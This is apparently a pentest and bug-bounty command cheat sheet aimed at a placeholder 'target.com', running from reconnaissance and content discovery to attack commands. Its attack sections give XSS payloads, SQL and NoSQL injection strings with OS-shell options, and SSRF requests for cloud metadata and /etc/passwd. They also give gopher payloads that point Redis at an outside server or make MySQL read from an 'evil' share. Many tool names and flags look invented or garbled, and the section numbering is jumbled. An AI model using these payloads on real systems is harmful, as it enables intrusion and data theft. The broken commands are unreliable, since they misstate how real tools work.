# 1. RECONNAISSANCE

## 1.1 Subdomain Enumeration
### 1.1.1 Passive:
    subfinder -d target.com -o subs.txt
    subfinder -d target.com -all -o subfinder.txt
    amass enum -passive -d target.com -config config.ini -o amass.txt
    findomain -t target.com -u findomain.txt
    findomain -t target.com -q -u subs.txt
    assetfinder --subs-only target.com > subs.txt
    assetfinder --subs-only target.com | anew assets.txt
    chaos -d target.com -o subs.txt
    chaos -d target.com -key $CHAOS_KEY -o chaos.txt
    sublist3r -d target.com -o subs.txt
    ------
    subfinder -d target.com -b -v -all -o subfinder.txt
    subfinder -d target.com -sources AlienVault,Censys,VirusTotal -o subfinder_partial.txt
    amass enum -passive -d target.com -config $HOME/.config/amass/config.ini -timeout 60 -o amass.txt
    amass enum -passive -d target.com -asn $(whois -h whois.radb.net '!gAS$(whois target.com | grep ASN | awk '{print $2}')' | grep origin | awk '{print $3}') -o amass_asn.txt
    findomain -t target.com -r -a -u findomain.txt
    findomain -t target.com -q -o findomain_quiet.txt
    assetfinder --subs-only target.com | sort -u | tee assetfinder.txt
    assetfinder --subs-only target.com -domains_only | anew domains.txt
    chaos -d target.com -key $CHAOS_KEY -silent -o chaos.txt
    chaos -d target.com -key $CHAOS_KEY -json -o chaos.json
    sublist3r -d target.com -o sublist3r.txt
    sublist3r -d target.com -b -p 80,443 -v -o sublist3r_ports.txt
    ------
    subfinder -d target.com -all -o sf_all.txt
    subfinder -d target.com -sources ArchiveOrg,Bufferoverun,Certspotter,Crtsh,Facebook,Hackertarget,Intelx,PassiveTotal,SecurityTrails,ThreatCrowd,VirusTotal -o sf_selected.txt
    subfinder -d target.com -exclude-sources Rapid7OpenData, зонд -o sf_excluded.txt
    amass enum -passive -d target.com -config $HOME/.config/amass/config.ini -timeout 90 -max-dns-queries 500 -o amass_tuned.txt
    amass enum -passive -d target.com -config $HOME/.config/amass/config.ini -only-dns -o amass_dns_only.txt
    findomain -t target.com -f subdomains.txt -o fd_file_output.txt
    findomain -t target.com -resolve -o fd_resolved.txt
    assetfinder --subs-only target.com | grep "\.gov$" | anew gov_subs.txt
    assetfinder --subs-only target.com | grep -v "\.test$" | anew non_test_subs.txt
    chaos -d target.com -key $CHAOS_KEY -dnl -o chaos_no_nl.txt
    chaos -d target.com -key $CHAOS_KEY -filter "CNAME" -o chaos_cname.txt
    sublist3r -d target.com -b -v -t 20 -o sl_threaded.txt
    sublist3r -d target.com -b -p 80,443,8080 -o sl_ports_extended.txt
    dig +short $(cat subfinder.txt) | sort -u | anew resolved_subs_dig.txt


### 1.1.2 Active:
    amass enum -d target.com -o subs.txt
    amass enum -active -d target.com -brute -w wordlist.txt -o active.txt
    gobuster dns -d target.com -w subdomains.txt -t 50 -o gobuster.txt
    shuffledns -d target.com -w wordlist.txt -r resolvers.txt -o shuffled.txt
    altdns -i subs.txt -o alt_out.txt -w words.txt -r -s altdns_output.txt
    dnsgen subs.txt | massdns -r resolvers.txt -t A -o S -w massdns.out
    ------
    amass enum -active -d target.com -brute -w /usr/share/wordlists/dns/subdomains-top1million-5000.txt -o active_top.txt
    amass enum -active -d target.com -brute -w custom_subdomains.txt -alters -o active_alters.txt
    gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-1million.txt -t 100 -o gobuster_top.txt
    gobuster dns -d target.com -w subdomains.txt -wildcard -o gobuster_wildcard.txt
    shuffledns -d target.com -w subdomains.txt -r /etc/resolv.conf -o shuffled_default_res.txt
    shuffledns -d target.com -w subdomains.txt -r $(cat resolvers.txt | shuf -n 10) -o shuffled_rand_res.txt
    altdns -i subfinder.txt -o altdns_combo.txt -w permutations.txt -s altdns_stats.txt
    altdns -i subfinder.txt -o altdns_wildcard.txt -w common_words.txt -r
    ------
    amass enum -active -d target.com -brute -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -o active_large.txt
    amass enum -active -d target.com -brute -w company_specific_subs.txt -alters -o active_company.txt
    gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/namelist.txt -t 200 -o gobuster_namelist.txt
    gobuster dns -d target.com -w subdomains.txt -wildcard -z -o gobuster_wildcard_quiet.txt
    shuffledns -d target.com -w subdomains.txt -r $(cat /etc/resolv.conf) -o shuffled_default.txt
    shuffledns -d target.com -w subdomains.txt -r $(cat resolvers.txt | grep "208.") -o shuffled_specific_res.txt
    altdns -i subfinder.txt -o altdns_more_perms.txt -w common_words.txt -r -s altdns_stats_more.txt -c 5
    altdns -i subfinder.txt -o altdns_longer_perms.txt -w long_wordlist.txt -r


## 1.2 DNS & Network Recon
    dnsx -l subs.txt -a -aaaa -cname -mx -txt -ptr -ns -soa -resp -o dns_records.json
    dnscan -d target.com -w subdomains.txt -o dnscan.txt
    fierce --domain target.com --wide --traverse 5 --search 5 --subdomains subs.txt
    dnsrecon -d target.com -a -z -t brt -D wordlist.txt -x report.xml
    dig any target.com @1.1.1.1
    whois target.com
    bgp.he.net search "Company Name" | tee bgp_info.txt
    whois -h whois.radb.net '!gAS12345' | tee ip_ranges.txt
    ------
    dnsx -l subfinder.txt -type A,AAAA,CNAME,MX,TXT,NS,SOA -resp-only -o dnsx_basic.txt
    dnsx -l subfinder.txt -a -aaaa -cname -mx -txt -ptr -ns -soa -resp -silent -o dnsx_silent.json
    dnsx -d target.com -ns -cname -resp-chain -o dnsx_chain.txt
    dnscan -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-1million.txt -t 100 -o dnscan_top.txt
    dnscan -d target.com -w subdomains.txt -r -o dnscan_recursive.txt
    fierce --domain target.com --wide --traverse 3 --search 3 --subdomains subfinder.txt --dnsserver 8.8.8.8 -outfile fierce.txt
    fierce --domain target.com --subdomains subdomains.txt --tcpport 53 -outfile fierce_tcp.txt
    dnsrecon -d target.com -Axfr -n ns1.target.com -o dnsrecon_axfr.txt
    dnsrecon -d target.com -t srv -D srv_records.txt -o dnsrecon_srv.txt
    dig axfr target.com @ns1.target.com +short | anew axfr_short.txt
    dig ns target.com +short | dnsx -type A -l - -o ns_ips.txt
    ------
    dnsx -l subfinder.txt -type A,AAAA,CNAME,MX,TXT,NS,SOA,SRV,PTR -retry 3 -timeout 5 -o dnsx_all_types.txt
    dnsx -d target.com -ns -cname -resp-chain -soa -silent -o dnsx_verbose.json
    dnsx -l subfinder.txt -ns-resolve -o dnsx_ns_resolved.txt
    dnscan -d target.com -w /usr/share/seclists/Discovery/DNS/huge.txt -t 150 -o dnscan_huge.txt
    dnscan -d target.com -w subdomains.txt -r -q -o dnscan_recursive_quiet.txt
    fierce --domain target.com --wide --traverse 4 --search 4 --subdomains subfinder.txt --dnsserver 1.1.1.1 -outfile fierce_cloudflare.txt
    fierce --domain target.com --subdomains subdomains.txt --tcpport 53 --timeout 10 -outfile fierce_tcp_timeout.txt
    dnsrecon -d target.com -Axfr -n ns2.target.com -o dnsrecon_axfr_secondary.txt
    dnsrecon -d target.com -t mx -D mx_records.txt -o dnsrecon_mx.txt
    dig any target.com +trace +noedns | tee dig_trace_noedns.txt
    dig soa target.com +short | dnsx -type A -l - -o soa_ips.txt

## 1.3 Cloud Infrastructure
    cloud_enum -k target -t aws,azure,gcp -l cloud_enum.log
    scout suite --provider aws --report-dir scout-report
    cfr -u https://target.com -o cfr_results.txt
    s3scanner scan -l buckets.txt
    s3scanner scan -l buckets.txt -o s3_results.json
    gcpbucketbrute -k target -w wordlist.txt -o gcp_buckets.txt
    prowler -g cislevel1 -M json -o prowler_report
    ------
    cloud_enum -k target -t aws -l aws_enum.log -details
    cloud_enum -k target -t azure -l azure_enum.log -verify
    cloud_enum -k target -t gcp -l gcp_enum.log -public
    scout suite --provider aws --regions all --output-dir scout_all_regions
    scout suite --provider azure --tenant-id $AZURE_TENANT_ID --output-dir scout_azure
    cfr -u https://s3.amazonaws.com/target-bucket/ -o cfr_s3.txt
    cfr -u https://target.blob.core.windows.net/container/ -o cfr_azure.txt
    s3scanner scan -b target-internal-bucket -o s3_internal.json -a
    gcpbucketbrute -k target -w common_bucket_names.txt -threads 50 -o gcp_common.txt
    gcpbucketbrute -k target -prefix staging -o gcp_staging.txt
    ------
    cloud_enum -k target -t aws:s3,ec2 -l aws_services.log -details
    cloud_enum -k target -t azure:storage,vm -l azure_services.log -verify
    cloud_enum -k target -t gcp:storage,compute -l gcp_services.log -public
    scout suite --provider aws --regions us-east-1,us-west-2 --output-dir scout_specific_regions
    scout suite --provider azure --resource-group $AZURE_RG --output-dir scout_azure_rg
    cfr -u https://target.s3.amazonaws.com/ -o cfr_s3_root.txt
    cfr -u https://target.blob.core.windows.net/$web/ -o cfr_azure_web.txt
    s3scanner scan -b target-logs-bucket -o s3_logs.json -p logs/
    gcpbucketbrute -k target -w common_prefixes.txt -prefix logs- -threads 75 -o gcp_logs.txt


# 1.4 ASN and IP Range Discovery (Detailed)
    amass intel -org "Target Company Inc." -whois -ip -asn -o amass_intel.txt
    amass intel -asn $(whois target.com | grep ASN | awk '{print $2}') -o amass_asn_details.txt
    bgp.he.net search "Target Company" | grep "AS" | awk '{print $1}' | tee asns_he.txt
    whois -h whois.radb.net "!i/$($(whois target.com | grep netname | awk '{print $2}'))" | grep inetnum | awk '{print $3}' | tee ip_ranges_name.txt
    ripe-dbase-client -q --sources RIPE --query-string $(whois target.com | grep inetnum | awk '{print $3}') | grep inet6 | awk '{print $3}' | tee ipv6_ranges.txt
    traceroute -n -I target.com | head -n 20 | awk '{print $2}' | sort -u | tee traceroute_ips.txt
    dig +trace target.com | grep "in a" | awk '{print $5}' | sort -u | tee dns_ips.txt
    ------
    amass intel -org "Target Corp" -whois -ip -asn -cidr -o amass_intel_cidr.txt
    amass intel -asn $(whois target.com | grep ASN | awk '{print $2}') -cidr -o amass_asn_cidrs.txt
    bgp.he.net search "AS$(whois target.com | grep ASN | awk '{print $2}')" | grep "Origin AS" | awk '{print $NF}' | sort -u | tee origin_asns.txt
    whois -h whois.radb.net "!i/%$(whois target.com | grep netname | awk '{print $2}')" | grep route | awk '{print $3}' | tee ip_routes.txt
    ripe-dbase-client -q --sources RIPE --query-string $(whois target.com | grep inetnum | awk '{print $3}') | grep inet6 | awk '{print $3}' | sort -u | tee ipv6_ranges_ripe.txt
    traceroute -n -T -p 80 target.com | head -n 20 | awk '{print $2}' | sort -u | tee traceroute_tcp_ips.txt
    host -t a $(dig ns target.com +short | head -n 1) | awk '{print $4}' | sort -u | tee first_ns_ips.txt

## 1.4 Port Scanning
    nmap -sV -T4 -p- -oA full_scan target.com
    naabu -host target.com -p - -o naabu.txt
    rustscan -a target.com --ulimit 5000 -- -sV
    masscan -p1-65535 target.com --rate=1000 -oG masscan.out
    testssl.sh -e -E -f -U -S -P -Q target.com
    tlsx -u target.com -san -cn

# 2. WEB DISCOVERY

## 2.1 URL Discovery
    gau target.com | tee urls.txt
    gau target.com --subs --threads 20 --o urls.txt
    waybackurls target.com > urls.txt
    waybackurls target.com | anew wayback.txt
    katana -u https://target.com -o urls.txt
    katana -u https://target.com -d 3 -jc -kf -o katana.txt
    hakrawler -url https://target.com -d 3 -subs -u -t 10
    gospider -s https://target.com -d 2 -t 10 -c 5 -o gospider
    ------
    gau target.com --subs --threads 50 --output urls_all.txt
    gau target.com --blacklist ".(jpg|jpeg|gif|png|css|js|ico|woff|woff2)$" --o gau_filtered.txt
    waybackurls target.com | grep -v "logout" | anew wayback_filtered.txt
    waybackurls target.com | grep "\?id=" | anew wayback_params_only.txt
    katana -u https://target.com -d 5 -jc -kf -o katana_deep.txt -persist
    katana -u https://target.com -js-timeout 30 -o katana_js_heavy.txt
    hakrawler -url https://target.com -d 4 -subs -u -t 20 -scope target.com -output hakrawler.txt
    hakrawler -url https://target.com -proxy http://127.0.0.1:8080 -output hakrawler_proxy.txt
    gospider -s https://target.com -d 3 -t 20 -c 10 -o gospider_deep -v
    gospider -s https://target.com -proxy socks5://127.0.0.1:9050 -o gospider_tor
    ------
    gau target.com --subs --threads 75 --output urls_aggressive.txt
    gau target.com --blacklist ".(svg|ttf|eot|otf|woff2)$" --o gau_no_fonts.txt
    waybackurls target.com | grep "\.json$" | anew wayback_json.txt
    waybackurls target.com | grep -E "admin|login|signup" | anew wayback_auth.txt
    katana -u https://target.com -d 6 -jc -kf -o katana_very_deep.txt -crawl-args "--no-sandbox"
    katana -u https://target.com -js-timeout 60 -depth 4 -o katana_js_heavy_deep.txt
    hakrawler -url https://target.com -d 5 -subs -u -t 25 -scope target.com -output hk_deep.txt -skip-static
    hakrawler -url https://target.com -proxy http://127.0.0.1:8080 -user-agent "Mozilla/5.0" -output hk_ua.txt
    gospider -s https://target.com -d 4 -t 25 -c 15 -o gospider_very_deep -v --no-redirect
    gospider -s https://target.com -proxy socks5://127.0.0.1:9050 --user-agent "curl/7.79.1" -o gospider_tor_curl

# 2.2 Directory/File Brute Forcing (Extensive)
    ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://target.com/FUZZ -t 200 -o ffuf_medium.json -recursion -r
    ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u https://target.com/FUZZ -t 150 -o ffuf_common.json -extensions ".php,.asp,.aspx,.js,.html"
    feroxbuster -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50 -o ferox_medium.txt -r -x "php js css"
    feroxbuster -u https://target.com -w custom_dirs.txt -t 75 -o ferox_custom.txt -f --status-code-blacklist 404,403
    dirsearch -u https://target.com -e php,asp,aspx,jsp,html,js -t 100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-big.txt -o dirsearch_big.txt
    dirsearch -u https://target.com -e bak,config,env -t 75 -w /usr/share/seclists/Discovery/Web-Content/extensions_common.txt -o dirsearch_ext.txt
    gobuster dir -u https://target.com -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/directory-list-1.0.txt -x php,html,js,json -t 100 -o gobuster_small.txt
    gobuster dir -u https://target.com -w custom_dirs_rare.txt -t 50 -z -o gobuster_rare.txt
    wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404,403 https://target.com/FUZZ -t 50 -o wfuzz_medium.txt
    wfuzz -c -z file,extensions_list.txt --hh 404 --hc 200 https://target.com/indexFUZZ -o wfuzz_ext.txt
    ------
    ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-xlarge.txt -u https://target.com/FUZZ -t 250 -o ffuf_xlarge.json -recursion -r -ic
    ffuf -w /usr/share/seclists/Discovery/Web-Content/special-chars-directory-list.txt -u https://target.com/FUZZ -t 200 -o ffuf_special.json -extensions ".php,.asp,.aspx,.js,.html,.json,.xml" -sf
    feroxbuster -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 60 -o ferox_large.txt -r -x "php js css html json xml" -vv
    feroxbuster -u https://target.com -w custom_sensitive_dirs.txt -t 80 -o ferox_sensitive.txt -f --status-code-blacklist 404,403,301,302 -n
    dirsearch -u https://target.com -e php,asp,aspx,jsp,html,js,json,xml,yaml -t 120 -w /usr/share/wordlists/dirbuster/directory-list-2.3-extender.txt -o dirsearch_extender.txt -f -b
    dirsearch -u https://target.com -e bak,config,env,log -t 90 -w /usr/share/seclists/Discovery/Web-Content/extensions_all.txt -o dirsearch_all_ext.txt -r
    gobuster dir -u https://target.com -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/directory-list-2.3-all.txt -x php,html,js,json,xml,yaml,config -t 120 -o gobuster_all.txt -z -q
    gobuster dir -u https://target.com -w custom_hidden_dirs.txt -t 70 -a "Mozilla/5.0" -o gobuster_hidden.txt
    wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-xlarge.txt --hc 404,403 --hh 301,302 https://target.com/FUZZ -t 60 -o wfuzz_xlarge.txt -v
    wfuzz -c -z file,all_extensions.txt --hw 404 --hc 200 https://target.com/indexFUZZ -o wfuzz_all_ext.txt --filter "c=200"

## 2.5 Parameter Discovery
    arjun -u https://target.com/api -o params.json
    arjun -u https://target.com/endpoint
    paramspider -d target.com -l high -o paramspider.txt
    paramspider -d target.com
    waybackparam -u target.com
    waybackparam -u target.com -o wayback_params.txt
    parameth -u https://target.com -f wordlist.txt
    qsreplace -a urls.txt
    qsreplace -a urls.txt -p common_params.txt -o all_params.txt
    ------
    arjun -u https://target.com/api -o params_api.json -m all
    arjun -u https://target.com/index.php?id=FUZZ -p /usr/share/seclists/Fuzzing/param-names/default.txt -o arjun_get.txt
    paramspider -d target.com -l all -o paramspider_all.txt -s
    waybackparam -u target.com -o wayback_params_all.txt -dedupe
    parameth -u https://target.com -f /usr/share/seclists/Fuzzing/param-names/special.txt -b "404,403" -t 20
    qsreplace -a urls.txt -p /usr/share/seclists/Fuzzing/GET-params-2021.txt -o all_params_get.txt
    qsreplace -a urls.txt -p /usr/share/seclists/Fuzzing/POST-params.txt -m POST -o all_params_post.txt
    ------
    arjun -u https://target.com/api -o params_api_full.json -m all -t 30
    arjun -u https://target.com/index.php?id=FUZZ&lang=en -p /usr/share/seclists/Fuzzing/param-names/all.txt -o arjun_get_all.txt
    paramspider -d target.com -l insane -o paramspider_insane.txt -s -w /usr/share/seclists/Fuzzing/predictable-parameters.txt
    waybackparam -u target.com -o wayback_params_full.txt -dedupe -filter "password|token|secret"
    parameth -u https://target.com -f /usr/share/seclists/Fuzzing/param-names/extended.txt -b "404,403,302" -t 25
    qsreplace -a urls.txt -p /usr/share/seclists/Fuzzing/GET-params-2021.txt -o all_params_get_long.txt -threads 30
    qsreplace -a urls.txt -p /usr/share/seclists/Fuzzing/POST-params.txt -m POST -o all_params_post_long.txt -threads 30

## 2.4 JavaScript Analysis
    linkfinder -i https://target.com/main.js -o endpoints.txt
    jsanalyze.py -u https://target.com/script.js -o js_results.txt
    secretfinder -i script.js -o secrets.json
    getjs --url https://target.com -o js_files/
    subjs -u https://target.com -o javascript_urls.txt
    ------
    linkfinder -i https://target.com/main.js -o endpoints_mainjs.txt -d
    linkfinder -i $(cat urls.txt | grep ".js$") -o all_js_endpoints.txt -r
    jsanalyze.py -u https://target.com/script.js -o js_results_script.txt -c cookies.txt
    jsanalyze.py -u $(cat subfinder.txt | grep ".js") -o all_js_analysis.txt -H "Authorization: Bearer token"
    secretfinder -i script.js -o secrets_script.json -r high
    secretfinder -i $(cat js_files/*.js) -o all_secrets.json -n
    getjs --url https://target.com -o js_files/ -d 3
    getjs --url $(cat subfinder.txt) -o all_sub_js/ -t 20
    subjs -u https://target.com -o javascript_urls_target.txt -v
    subjs -u $(cat urls.txt) -o all_javascript_urls.txt -c 50
    ------
    linkfinder -i https://target.com/main.js -o endpoints_mainjs_deep.txt -d -w common_words.txt
    linkfinder -i $(cat urls.txt | grep ".js$") -o all_js_endpoints_full.txt -r -c cookies.txt -H "Authorization: Bearer token"
    jsanalyze.py -u https://target.com/script.js -o js_results_script_full.txt -c cookies.txt -p all
    jsanalyze.py -u $(cat subfinder.txt | grep ".js") -o all_js_analysis_verbose.txt -H "X-API-Key: secret" -v
    secretfinder -i script.js -o secrets_script_verbose.json -r all -a
    secretfinder -i $(cat js_files/*.js) -o all_secrets_detailed.json -n -e entropy
    getjs --url https://target.com -o js_files/ -d 5 -t 30
    getjs --url $(cat subfinder.txt) -o all_sub_js_verbose/ -t 30 -v --user-agent "Chrome/100.0.0.0"
    subjs -u https://target.com -o javascript_urls_target_full.txt -v -a
    subjs -u $(cat urls.txt) -o all_javascript_urls_deep.txt -c 75 -oA

## 2.3 Content Discovery
    feroxbuster -u https://target.com -w wordlist.txt
    ffuf -w wordlist.txt -u https://target.com/FUZZ
    ffuf -w wordlist.txt -u https://target.com/FUZZ -t 100 -o ffuf.json
    dirsearch -u https://target.com -e php,asp,aspx,jsp -t 50
    gobuster dir -u https://target.com -w wordlist.txt -x php,html
    wfuzz -c -z file,wordlist.txt --hc 404 https://target.com/FUZZ

# 3. VULNERABILITY SCANNING

## 3.1 Automated Scanning
    nuclei -u https://target.com -t nuclei-templates/
    nuclei -l urls.txt -t nuclei-templates/ -severity critical,high -o nuclei.txt
    nuclei -l urls.txt -t nuclei-templates/ -me results/
    nikto -h https://target.com -output nikto.xml -Format xml
    zap -cmd -quickurl https://target.com -quickout report.html
    wpscan --url https://target.com --enumerate vp,vt,tt,cb,dbe
    cent -u target.com -s high,critical
    ------
    nuclei -u https://target.com -t nuclei-templates/http/ -severity critical,high,medium -o nuclei_http.txt -rate-limit 100 -bulk-size 50
    nuclei -l subfinder.txt -t nuclei-templates/dns/ -o nuclei_dns.txt -exclude-severity low,info
    nikto -h https://target.com -output nikto_full.xml -Format xml -C all -Tuning x,c,i,a,s,b,e
    nikto -h https://target.com -output nikto_ssl.txt -Format txt -ssl -port 443
    zap -cmd -quickurl https://target.com -quickout report_zap.html -config zap_config.ini
    zap -cmd -quickurl https://target.com -quickprogress -apikey $ZAP_API_KEY
    testssl.sh -e -E -f -U -S -P -Q --ip $(dig +short target.com | head -n 1) target.com
    testssl.sh --vulnerabilities target.com
    wpscan --url https://target.com --enumerate p,u,t,m,c --api-token $WP_SCAN_TOKEN -o wpscan_full.txt
    wpscan --url https://target.com/blog --plugins-version --themes-version
    ------
    nuclei -u https://target.com -t nuclei-templates/http/,custom-templates/ -severity critical,high,medium,low -o nuclei_all.txt -rate-limit 150 -bulk-size 75 -retries 5
    nuclei -l subfinder.txt -t nuclei-templates/dns/,third-party-templates/ -o nuclei_all_dns.txt -exclude-severity info -concurrency 100
    nikto -h https://target.com -output nikto_very_full.xml -Format xml -C all -Tuning x,c,i,a,s,b,e,1,2,3,4,5,6,7 -evasion 1,2,3,4 -useragent "Custom-Scanner/1.0"
    nikto -h https://target.com -output nikto_ssl_extended.txt -Format txt -ssl -port 443 -mutate 1,2,3
    zap -cmd -quickurl https://target.com -quickout report_zap_full.html -config zap_advanced_config.ini -ajaxspider
    zap -cmd -quickurl https://target.com -quickprogress -apikey $ZAP_API_KEY -recursive -maxchildren 10
    testssl.sh -e -E -f -U -S -P -Q --ip $(dig +short target.com | head -n 1) target.com --file vulns.txt --openssl /usr/bin/openssl1.1
    testssl.sh --all target.com
    wpscan --url https://target.com --enumerate p,u,t,m,c,dbe,ap --api-token $WP_SCAN_TOKEN -o wpscan_very_full.txt --plugins-detection aggressive --themes-detection aggressive
    wpscan --url https://target.com/blog --plugins-version --themes-version --verbose

## 3.2 XSS Testing
    dalfox url 'https://target.com/search?q=test'
    dalfox url 'https://target.com/search?q=test' -b https://xss.burpcollab.net
    xsstrike -u "https://target.com/search?q=1"
    xsstrike -u "https://target.com/search?q=1" --crawl -t 10
    xsser -u "https://target.com" -g "/search.php?q=XSS" -c 3
    kxsstester -u https://target.com/search?q=1
    kxsstester -u https://target.com/search?q=1 --dom --post-data 'param=val'
    brutexss -u https://target.com -p "param1 param2" -w xss_payloads.txt
    ------
    dalfox url 'https://target.com/search?q=test' -b https://xss.burpcollab.net -w /usr/share/seclists/Fuzzing/XSS/XSS-Payloads-L5.txt -p 10
    dalfox url 'https://target.com/submit' -p 'param1=value1&param2=<script>alert(1)</script>' -X POST -b https://xss.burpcollab.net
    xsstrike -u "https://target.com/search?q=1" --crawl -t 20 --fuzzer all --level 3 -o xsstrike_crawl.txt
    xsstrike -u "https://target.com/profile?id=1" --params "id" -p /usr/share/seclists/Fuzzing/XSS/XSS-Payloads.txt
    xsser -u "https://target.com" -g "/search.php?q=XSS" -c 5 --payloads /usr/share/seclists/Fuzzing/XSS/XSS-Payloads.txt
    xsser -u "https://target.com/form.html" --post="name=test&email=<script>alert(1)</script>"
    kxsstester -u https://target.com/search?q=1 --dom --post-data 'param=val' --payloads /usr/share/seclists/Fuzzing/XSS/DOMXSS.txt
    kxsstester -u https://target.com/vuln#test=<script>alert(1)</script> --hash
    brutexss -u https://target.com -p "name query search" -w /usr/share/seclists/Fuzzing/XSS/XSS-Payloads.txt -t 30
    brutexss -u https://target.com -data "param1=value1&param2=FUZZ" -w /usr/share/seclists/Fuzzing/XSS/XSS-Payloads.txt -m POST
    ------
    dalfox url 'https://target.com/search?q=test' -b https://xss.burpcollab.net -w /usr/share/seclists/Fuzzing/XSS/XSS-Payloads-Full.txt -p 15 -smart
    dalfox url 'https://target.com/submit' -p 'param1=value1&param2=<img src=x onerror=alert(1)>' -X POST -b https://xss.burpcollab.net -blind-timeout 30
    xsstrike -u "https://target.com/search?q=1" --crawl -t 25 --fuzzer all --level 5 -o xsstrike_crawl_full.txt --vectors all
    xsstrike -u "https://target.com/profile?id=1" --params "id" -p /usr/share/seclists/Fuzzing/XSS/XSS-Polyglots.txt --encode
    xsser -u "https://target.com" -g "/search.php?q=XSS" -c 7 --payloads /usr/share/seclists/Fuzzing/XSS/XSS-Payloads-Advanced.txt --delay 2
    xsser -u "https://target.com/form.html" --post="name=test&email=<svg><script>alert(1)</script></svg>" --headers "Content-Type: application/xml"
    kxsstester -u https://target.com/search?q=1 --dom --post-data 'param=val' --payloads /usr/share/seclists/Fuzzing/XSS/DOMXSS.txt --proxy http://127.0.0.1:8080
    kxsstester -u https://target.com/vuln#test=<img src=x onerror=prompt(1)> --hash --user-agent "Mozilla/5.0"
    brutexss -u https://target.com -p "name query search input" -w /usr/share/seclists/Fuzzing/XSS/XSS-Payloads-L5.txt -t 35 -headers "X-Forwarded-For: 127.0.0.1"
    brutexss -u https://target.com -data "param1=value1&param2=FUZZ" -w /usr/share/seclists/Fuzzing/XSS/XSS-Event-Attributes.txt -m POST -cookies "sessionid=..."

## 3.3 SQL Injection
    sqlmap -u "https://target.com?id=1" --batch
    sqlmap -u "https://target.com?id=1" --batch --level 5 --risk 3 --dbs
    sqlmap -r request.txt --dbs
    nosqli scan -u https://target.com/api?id=1
    nosqlmap -u https://target.com/api?query=admin
    ghauri --url https://target.com/search.php?q=1 --dbs
    jsql -u https://target.com/vuln.jsp?id=1
    sqli-detector -u https://target.com/login
    ------
    sqlmap -u "https://target.com?id=1" --batch --level 5 --risk 3 --dbs --threads 10
    sqlmap -u "https://target.com/news.php?id=1" --dbs --tamper="apostrophemask,apostrophenullencode,charencode"
    nosqlmap -u https://target.com/api?query=admin --mongo-shell --os-shell
    nosqlmap -u https://target.com/users --get --value "'or 1=1--"
    ghauri --url https://target.com/search.php?q=1 --dbs --threads 5
    ghauri --url https://target.com/item?name=test' --identify
    jsql -u https://target.com/vuln.jsp?id=1 --test="AND SLEEP(5)"
    jsql -u https://target.com/data.jsp?search=admin%25' --blind
    sqli-detector -u https://target.com/login --data "username=test&password='or 1=1--'"
    sqli-detector -u https://target.com/profile.php?user=1' --check-errors
    ------
    sqlmap -u "https://target.com?id=1" --batch --level 5 --risk 3 --dbs --threads 15 --tamper="apostrophemask,apostrophenullencode,charencode,randomcase,unionallcols,unmagicquotes"
    sqlmap -u "https://target.com/news.php?id=1" --dbs --tamper="base64encode,htmlencode,urlencode" --time-sec 10
    nosqlmap -u https://target.com/api?query=admin --mongo-shell --os-shell --tamper="modunion"
    nosqlmap -u https://target.com/users --get --value "'});db.injection.find({$where:'sleep(5000)'});//"
    ghauri --url https://target.com/search.php?q=1 --dbs --threads 7 --tamper="space2comment"
    ghauri --url https://target.com/item?name=test' --identify --skip-waf
    jsql -u https://target.com/vuln.jsp?id=1 --test="PROCEDURE ANALYSE(sleep(5))"
    jsql -u https://target.com/data.jsp?search=admin%25' --blind --string "admin record"
    sqli-detector -u https://target.com/login --data "username=test&password='or sleep(5)--'" --timeout 10
    sqli-detector -u https://target.com/profile.php?user=1' --check-errors --verbose

## 3.4 Server-Side Vulnerabilities

### SSRF:
    ssrfmap -r request.txt -p url=https://yourcollab.com
    ssrfmap -r request.txt -p url=https://yourcollab.com -m portscan
    gopherus --exploit mysql
    gopherus --exploit mysql --inject 'curl https://collab.net'
    ground-control -u https://target.com/redirect?url=COLLAB
    qsreplace -a urls.txt -p ssrf_payloads.txt -o ssrf_urls.txt
    ------
    ssrfmap -r request.txt -p url=https://$(whoami).oastify.com -m portscan -ports 80,443,21,22
    ssrfmap -r post_request.txt -p callback=http://your-server.com/receive -X POST
    gopherus --exploit mysql --inject 'SELECT LOAD_FILE("\\\\\\\\evil\\\\\\\\share\\\\\\\\file.txt")' | curl -v --data-urlencode "url=gopher://127.0.0.1:3306/_$(cat -)" https://target.com/proxy
    gopherus --exploit redis --command "SLAVEOF your-server.com 6379" | curl -v --data-urlencode "url=gopher://127.0.0.1:6379/_$(cat -)" https://target.com/api
    ground-control -u https://target.com/redirect?url=file:///etc/passwd -w /usr/share/wordlists/fuzzdb/wordlists-common/file-extensions-common.txt
    ground-control -u https://target.com/proxy?u=http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id
    qsreplace -a urls.txt -p "http://localhost,http://127.0.0.1,file:///,gopher://" -o ssrf_potential.txt
    ------
    ssrfmap -r request.txt -p url=dict://localhost:11211/info -m portscan -ports 1-1000
    ssrfmap -r post_request.txt -p callback=http://[::1]:80/receive -X POST
    gopherus --exploit mysql --inject 'SELECT @@version' | curl -v --data-urlencode "url=gopher://127.0.0.1:3306/_$(cat -)" https://target.com/proxy
    gopherus --exploit redis --command "PING" | curl -v --data-urlencode "url=gopher://127.0.0.1:6379/_$(cat -)" https://target.com/api
    ground-control -u https://target.com/redirect?url=http://169.254.169.254/latest/meta-data/ -w /usr/share/wordlists/fuzzdb/wordlists-common/file-extensions-common.txt -H "X-Forwarded-For: 127.0.0.1"
    ground-control -u https://target.com/proxy?u=http://[0:0:0:0:0:ffff:a9fe:a9fe]/latest/meta-data/
    qsreplace -a urls.txt -p "http://0,http://0.0.0.0,http://[::],file:///,gopher://,ftp://" -o ssrf_bypasses.txt

### XXE:
    xxeinjector -f request.xml
    docem -u https://target.com/upload

### File Inclusion:
    lfisuite -u https://target.com/view?file=index.html -o lfi_results.txt
